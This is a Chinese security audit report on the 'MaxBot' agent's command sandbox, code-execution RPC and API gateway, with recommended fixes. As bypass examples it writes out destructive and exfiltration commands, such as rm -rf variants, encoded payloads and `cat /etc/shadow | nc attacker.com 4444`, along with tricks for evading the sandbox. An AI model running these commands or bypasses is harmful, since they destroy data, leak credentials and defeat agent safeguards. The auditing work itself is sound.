# MaxBot 安全审查报告

审查时间：2026年4月16日  
审查文件：tools/sandbox.py, tools/shell_tools.py, tools/code_execution.py, gateway/server.py, knowledge/sandbox_validator.py

## 1. 危险命令检测绕过风险

### 问题：
- **正则表达式覆盖不全**：`sandbox.py` 中的 `_DANGEROUS_PATTERNS` 仅覆盖部分危险命令模式，存在多种绕过方式。
- **rm -rf 变种绕过**：
  - 模式 `r"\\brm\\s+(-rf?|--recursive)\\s+[/~]"` 仅匹配根目录或家目录，但 `rm -rf /tmp`、`rm -rf ./`、`rm -rf ../*` 等未被阻止。
  - 通配符变种：`rm -rf ./*` 不会匹配 `r"\\brm\\s+(-rf?|--recursive)\\s+\\*"`（因为 `.` 在中间）。
- **编码绕过**：支持十六进制、八进制编码的命令（如 `echo -e "\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f"`）可能不被检测。
- **管道和重定向**：`echo "malicious" > /etc/passwd`、`cat /etc/shadow | nc attacker.com 4444` 等组合命令未被检测。
- **其他危险命令缺失**：`wget`、`curl`（下载恶意脚本）、`chmod`、`chown`（权限提升）、`dd`（磁盘覆盖）等未完全覆盖。

### 攻击向量：
1. **路径绕过**：`rm -rf /tmp/important_data` 绕过根目录检测。
2. **编码绕过**：使用 `echo -e` 或 `printf` 执行编码后的危险命令。
3. **通配符绕过**：`rm -rf /*` 被阻止，但 `rm -rf /.*` 可能未被检测。
4. **组合命令**：`safe_command; rm -rf /` 或 `safe_command && rm -rf /` 可能被 `validate_command` 检测，但更复杂的注入如 `$(rm -rf /)` 或 `` `rm -rf /` `` 可能依赖于正则匹配的准确性。

## 2. 命令注入风险

### 问题：
- **shell=True 使用**：`shell_tools.py` 中的 `shell` 函数使用 `subprocess.run(..., shell=True)`，允许 shell 解释，增加注入风险。
- **输入验证不足**：`validate_command` 仅进行静态字符串检查，无法防止动态构造的命令。
- **命令拼接**：如果用户输入被直接拼接到命令中（虽然当前未直接暴露），但通过 `shell=True` 传递整个命令字符串仍可能被恶意构造。

### 攻击向量：
1. **分号注入**：`test; rm -rf /` 可能被正则检测，但 `test%0Arm%20-rf%20/`（URL编码换行）可能绕过。
2. **反引号/子shell**：`` `rm -rf /` `` 或 `$(rm -rf /)` 应被正则匹配，但复杂编码可能绕过。
3. **环境变量注入**：`CMD="rm -rf /"; $CMD` 可能不被检测。
4. **通配符扩展**：`rm -rf /tmp/*` 可能允许，但删除重要文件。

## 3. RPC 机制漏洞

### 问题：
- **文件竞争条件**：`code_execution.py` 中的文件 RPC 使用临时目录和文件重命名，可能存在竞争条件（TOCTOU）。
- **权限提升**：RPC 目录权限可能过于宽松，允许其他用户访问或篡改请求/响应文件。
- **未加密通信**：RPC 通过明文文件通信，可能被嗅探或篡改。
- **工具调用限制绕过**：`max_tool_calls` 计数器在多线程环境下可能不准确（虽然使用列表可变对象，但无锁保护）。

### 攻�向量：
1. **文件替换攻击**：在父进程读取请求文件前，恶意进程替换文件内容。
2. **符号链接攻击**：创建符号链接指向敏感文件，导致父进程读取或写入任意文件。
3. **拒绝服务**：大量创建请求文件，耗尽磁盘空间或导致父进程阻塞。
4. **计数器绕过**：并发请求可能导致工具调用计数器不准确，超过 `max_tool_calls` 限制。

## 4. API Key 认证不足

### 问题：
- **可选认证**：`gateway/server.py` 中，如果 `config.api_keys` 为空，则跳过验证（第275-276行）。这可能导致未授权访问。
- **WebSocket 无认证**：`/ws/{session_id}` 端点没有 API Key 验证，任何人都可连接。
- **CORS 配置过宽**：`allow_origins=["*"]` 允许任何来源的跨域请求，增加 CSRF 风险。
- **无速率限制**：API 端点没有速率限制，可能遭受暴力破解或拒绝服务攻击。
- **密钥硬编码风险**：配置文件中 API Key 可能明文存储。

### 攻击向量：
1. **未授权访问**：当 `api_keys` 为空时，任何人均可调用 `/chat`、`/tools/{tool_name}/call` 等端点。
2. **WebSocket 劫持**：攻击者可连接任意 `session_id`，窃听或注入消息。
3. **CSRF 攻击**：恶意网站可利用 CORS 配置发起跨域请求。
4. **暴力破解**：无速率限制，可尝试猜测 API Key（如果启用）。

## 5. 安全扫描规则覆盖不足

### 问题：
- **静态分析局限**：`sandbox_validator.py` 中的 `_DANGEROUS_PATTERNS` 和 `_DANGEROUS_IMPORTS` 列表不完整，且基于正则表达式和 AST 的静态分析无法检测所有恶意行为。
- **动态行为未检测**：代码可能使用反射、动态导入、代码混淆等技术绕过静态分析。
- **沙箱逃逸**：`run_sandboxed` 使用 `subprocess.run` 执行测试，但未限制系统调用或资源，可能通过 fork bomb、内存耗尽等方式逃逸。
- **测试用例不足**：自动生成的测试用例可能不覆盖恶意输入。

### 攻击向量：
1. **动态导入绕过**：`__import__('subprocess')` 或 `importlib.import_module('os')` 可能被检测，但 `getattr(__builtins__, 'eval')` 可能绕过。
2. **代码混淆**：使用 `base64`、`zlib` 解压后执行恶意代码。
3. **沙箱逃逸**：通过 `resource.setrlimit` 耗尽 CPU，或创建大量线程导致拒绝服务。
4. **测试注入**：生成的测试代码可能包含用户可控内容，导致注入。

## 6. 其他安全问题

### 问题：
- **敏感信息泄露**：错误消息可能泄露内部路径、堆栈跟踪等信息（如 `shell_tools.py` 第47行返回 `str(e)`）。
- **临时文件安全**：`code_execution.py` 使用 `tempfile.mkdtemp`，但未设置安全权限，可能被其他用户访问。
- **持久化数据安全**：`gateway/server.py` 中 SQLite 数据库未加密，会话历史可能包含敏感信息。
- **CORS 配置**：允许所有来源且允许凭证，可能导致敏感数据泄露。

### 攻击向量：
1. **信息泄露**：错误消息暴露内部结构，辅助进一步攻击。
2. **临时文件竞争**：攻击者监控临时目录，在文件创建后立即读取或篡改。
3. **数据库注入**：SQLite 查询未使用参数化查询（第152、195行），存在 SQL 注入风险（虽然使用 `?` 占位符，但需确认）。
4. **会话劫持**：会话 ID 生成算法（`uuid.uuid4()[:12]`）可能可预测。

## 总结与建议

### 高风险漏洞：
1. 命令检测绕过（通过编码、路径变种、组合命令）。
2. 命令注入（`shell=True` 使用）。
3. API 认证可选导致未授权访问。
4. WebSocket 端点无认证。

### 中等风险漏洞：
1. RPC 文件竞争条件。
2. 安全扫描规则覆盖不足。
3. CORS 配置过宽。
4. 临时文件权限问题。

### 建议：
1. **增强命令检测**：
   - 扩展 `_DANGEROUS_PATTERNS`，覆盖更多危险命令和路径模式。
   - 使用多引擎检测（正则、AST、沙箱执行）。
   - 考虑使用 `shlex` 解析命令，检查每个参数。
2. **避免 shell=True**：
   - 使用 `subprocess.run([...], shell=False)` 并传递参数列表。
   - 如果必须使用 shell，严格验证和转义用户输入。
3. **强制 API 认证**：
   - 要求 `api_keys` 非空，并使用强密钥。
   - 为 WebSocket 端点添加认证（如查询参数或握手时验证）。
4. **修复 RPC 安全**：
   - 使用安全的 IPC 机制（如 Unix 套接字）。
   - 设置临时目录权限为 `0700`。
   - 使用原子操作和文件锁防止竞争。
5. **增强安全扫描**：
   - 集成专业静态分析工具（如 Bandit、Semgrep）。
   - 添加动态分析（在沙箱中监控系统调用）。
   - 定期更新危险模式库。
6. **其他加固**：
   - 限制 CORS 为特定域名。
   - 添加速率限制（如 `slowapi`）。
   - 使用参数化查询防止 SQL 注入。
   - 确保错误消息不泄露敏感信息。

**总体评价**：当前安全机制存在多个严重漏洞，攻击者可能绕过命令检测、执行未授权操作、或利用 RPC 缺陷。建议立即修复高风险问题，并进行全面渗透测试。
